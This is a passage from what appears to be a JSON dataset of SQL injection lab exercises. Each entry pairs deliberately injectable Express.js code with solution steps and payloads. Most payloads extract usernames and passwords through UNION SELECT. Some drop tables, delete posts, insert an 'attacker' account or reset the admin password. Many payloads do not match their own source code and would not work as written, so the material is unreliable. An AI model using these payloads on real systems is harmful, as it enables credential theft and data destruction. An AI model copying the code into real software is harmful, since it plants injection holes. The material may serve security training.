      "ORDER BY 2 UNION SELECT id, email FROM users--",
      "ORDER BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in UPDATE Clause",
    "Lab Description": "The API Gateway allows updating user profile information but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the update profile endpoint.",
      "Inject SQL payloads into the 'username' parameter, such as 'username = 'hacked' WHERE id = 1--'.",
      "Check for successful modification of user data.",
      "Use sqlmap to automate the exploitation and modify user data.",
      "Verify the successful modification of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.put('/update-profile', (req, res) => {\n  const { username, email } = req.body;\n  const query = `UPDATE users SET username = '${username}', email = '${email}' WHERE id = ${req.body.id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Profile updated' });\n  });\n});",
    "payloads": [
      "username = 'hacked' WHERE id = 1--",
      "username = 'admin' WHERE id = 2--",
      "username = 'root' WHERE id = 3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows filtering transactions by type but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions HAVING transaction_type = '${transaction_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in WHERE Clause",
    "Lab Description": "The IoT dashboard allows users to view device status based on device ID but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve unauthorized data from other tables.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device status endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1 OR 1=1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const device_id = req.query.device_id;\n  const query = `SELECT * FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1 UNION SELECT username, password FROM users--",
      "2 OR 1=1 UNION SELECT id, password FROM users--",
      "3 OR 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows admins to add new categories but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the categories table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add category endpoint.",
      "Inject SQL payloads into the 'category_name' parameter, such as ''); INSERT INTO categories (name) VALUES ('MaliciousCategory')--'.",
      "Check for successful insertion of malicious data into the categories table.",
      "Use sqlmap to automate the exploitation and insert data.",
      "Verify the successful insertion of malicious data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-category', (req, res) => {\n  const category_name = req.body.category_name;\n  const query = `INSERT INTO categories (name) VALUES ('${category_name}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Category added' });\n  });\n});",
    "payloads": [
      "'); INSERT INTO categories (name) VALUES ('MaliciousCategory')--",
      "'); INSERT INTO categories (name) VALUES ('HackedCategory')--",
      "'); INSERT INTO categories (name) VALUES ('ExploitCategory')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying users by email but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query users endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'SELECT * FROM users WHERE email = '' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-users', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "SELECT * FROM users WHERE email = '' UNION SELECT username, password FROM users--",
      "SELECT * FROM users WHERE email = 'admin' UNION SELECT id, password FROM users--",
      "SELECT * FROM users WHERE email = 'user@example.com' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows filtering transactions by date but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'date_range' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const date_range = req.query.date_range;\n  const query = `SELECT * FROM transactions HAVING date_range = '${date_range}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in JOIN Clause",
    "Lab Description": "The IoT dashboard allows joining device information with user data but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to retrieve unauthorized user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the join device data endpoint.",
      "Inject SQL payloads into the 'join_condition' parameter, such as 'JOIN users ON devices.user_id = users.id UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/join-device', (req, res) => {\n  const join_condition = req.query.join_condition;\n  const query = `SELECT * FROM devices JOIN users ON ${join_condition}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON devices.user_id = users.id UNION SELECT username, password FROM users--",
      "JOIN employees ON devices.user_id = employees.id UNION SELECT id, password FROM users--",
      "JOIN accounts ON devices.user_id = accounts.id UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows querying articles by author but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article query endpoint.",
      "Inject SQL payloads into the 'author' parameter, such as '1' OR '1'='1' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-articles', (req, res) => {\n  const author = req.query.author;\n  const query = `SELECT * FROM articles WHERE author = '${author}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1 UNION SELECT username, password FROM users--",
      "admin OR 1=1 UNION SELECT id, password FROM users--",
      "' OR 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API Gateway allows ordering users by registration date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the user ordering endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/order-users', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM users ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT id, password FROM users--",
      "ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in UNION SELECT",
    "Lab Description": "The banking portal allows filtering user transactions but fails to sanitize input in the UNION SELECT clause. To solve: Exploit the UNION SELECT clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions WHERE type = '${transaction_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "UNION SELECT username, password FROM users--",
      "UNION SELECT id, password FROM users--",
      "UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS allows grouping articles by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article filtering endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Check for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles GROUP BY ${category}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT id, password FROM users--",
      "GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to query their transaction history by date, but the query is vulnerable in the WHERE clause. To solve: Exploit the WHERE clause to extract unauthorized information from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' OR '1'='1'.",
      "Observe for any unauthorized information leak from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM transactions WHERE transaction_date = '${date}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "2021-01-01' OR '1'='1'",
      "2021-01-01' OR '1'='1' UNION SELECT username, password FROM users--",
      "2021-01-01' OR '1'='1' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows admins to delete posts by post ID but fails to sanitize the input. To solve: Exploit the DELETE clause to remove posts or insert malicious data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete post endpoint.",
      "Inject SQL payloads into the 'post_id' parameter, such as '1; DELETE FROM posts WHERE post_id = 1--'.",
      "Check for successful post deletion or any anomalies in the database.",
      "Use sqlmap to automate the exploitation and test for additional vulnerabilities.",
      "Verify if the post was deleted or manipulated."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-post', (req, res) => {\n  const post_id = req.query.post_id;\n  const query = `DELETE FROM posts WHERE post_id = '${post_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Post deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM posts WHERE post_id = 1--",
      "1; DROP TABLE posts--",
      "1; INSERT INTO posts (title, content) VALUES ('Malicious Title', 'Malicious Content')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying user details by email but fails to sanitize the input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query user endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'example@domain.com' UNION SELECT username, password FROM users--.",
      "Observe the response for any unauthorized data leakage.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-user', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to group transactions by type but fails to sanitize the input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions GROUP BY ${transaction_type}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT id, password FROM users--",
      "GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting devices by name but fails to sanitize the input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device sorting endpoint.",
      "Inject SQL payloads into the 'sort_order' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-devices', (req, res) => {\n  const sort_order = req.query.sort_order;\n  const query = `SELECT * FROM devices ORDER BY ${sort_order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT id, password FROM users--",
      "ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS allows fetching articles with their associated authors but fails to sanitize the JOIN clause input. To solve: Exploit the JOIN clause to retrieve unauthorized user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article query endpoint.",
      "Inject SQL payloads into the 'join_condition' parameter, such as 'JOIN users ON articles.author_id = users.id UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/join-articles', (req, res) => {\n  const join_condition = req.query.join_condition;\n  const query = `SELECT * FROM articles JOIN users ON ${join_condition}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON articles.author_id = users.id UNION SELECT username, password FROM users--",
      "JOIN accounts ON articles.author_id = accounts.id UNION SELECT id, password FROM users--",
      "JOIN employees ON articles.author_id = employees.id UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway allows users to filter transactions by amount, but it fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve additional sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'amount' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const amount = req.query.amount;\n  const query = `SELECT * FROM transactions HAVING amount = '${amount}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows users to submit comments but fails to sanitize input during the INSERT operation. To solve: Exploit the INSERT clause to execute arbitrary SQL queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the comment submission endpoint.",
      "Inject SQL payloads into the 'comment' parameter, such as '1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--'.",
      "Check for successful comment submission and any changes in the database.",
      "Use sqlmap to automate the exploitation and test for additional vulnerabilities.",
      "Verify if the malicious SQL query was executed."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO comments (comment) VALUES ('${comment}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Comment submitted' });\n  });\n});",
    "payloads": [
      "1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--",
      "1); DROP TABLE comments--",
      "1); UPDATE users SET password='newpassword' WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIKE Clause",
    "Lab Description": "The banking portal allows users to search transactions by description but fails to sanitize input in the LIKE clause. To solve: Exploit the LIKE clause to retrieve unauthorized data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction search endpoint.",
      "Inject SQL payloads into the 'description' parameter, such as 'LIKE '%user%' UNION SELECT username, password FROM users--'.",
      "Observe the response for any unauthorized data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-transactions', (req, res) => {\n  const description = req.query.description;\n  const query = `SELECT * FROM transactions WHERE description LIKE '${description}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "LIKE '%user%' UNION SELECT username, password FROM users--",
      "LIKE '%admin%' UNION SELECT id, password FROM users--",
      "LIKE '%test%' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in AND Clause",
    "Lab Description": "The banking portal allows users to filter transactions by status, but the query is vulnerable in the AND clause. To solve: Exploit the AND clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active' AND '1'='1'.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT * FROM transactions WHERE status = '${status}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "active' AND '1'='1",
      "active' AND '1'='1' UNION SELECT username, password FROM users--",
      "active' AND '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UNION Clause",
    "Lab Description": "The CMS allows users to search posts by keyword, but the query is vulnerable in the UNION clause. To solve: Exploit the UNION clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the search posts endpoint.",
      "Inject SQL payloads into the 'keyword' parameter, such as 'test' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-posts', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM posts WHERE title LIKE '%${keyword}%'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "The API Gateway allows users to filter products by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as 'Electronics' GROUP BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products GROUP BY ${category}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "Electronics' GROUP BY 1 UNION SELECT username, password FROM users--",
      "Electronics' GROUP BY 2 UNION SELECT id, password FROM users--",
      "Electronics' GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard allows users to view a list of devices with a limit on the number of devices shown, but the query is vulnerable in the LIMIT clause. To solve: Exploit the LIMIT clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the list devices endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '10' LIMIT 1,1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/list-devices', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "10' LIMIT 1,1 UNION SELECT username, password FROM users--",
      "10' LIMIT 1,1 UNION SELECT id, password FROM users--",
      "10' LIMIT 1,1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying users by email but fails to sanitize the input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query user endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'user@domain.com' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-user', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS allows filtering articles by tag but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter articles endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'technology' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM articles HAVING tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "technology' HAVING 1=1 UNION SELECT username, password FROM users--",
      "technology' HAVING 1=1 UNION SELECT id, password FROM users--",
      "technology' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows users to sort devices by name, but the query is vulnerable in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the sort devices endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'name' ORDER BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-devices', (req, res) => {\n  const orderBy = req.query.order_by;\n  const query = `SELECT * FROM devices ORDER BY ${orderBy}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "name' ORDER BY 1 UNION SELECT username, password FROM users--",
      "name' ORDER BY 2 UNION SELECT id, password FROM users--",
      "name' ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to filter transactions by account number, but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as '12345' OR '1'='1'.",
      "Check for any unauthorized data leakage from the transactions table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const accountNumber = req.query.account_number;\n  const query = `SELECT * FROM transactions WHERE account_number = '${accountNumber}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "12345' OR '1'='1",
      "12345' OR '1'='1' UNION SELECT username, password FROM users--",
      "12345' OR '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway allows users to filter products by price range, but the query is vulnerable in the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
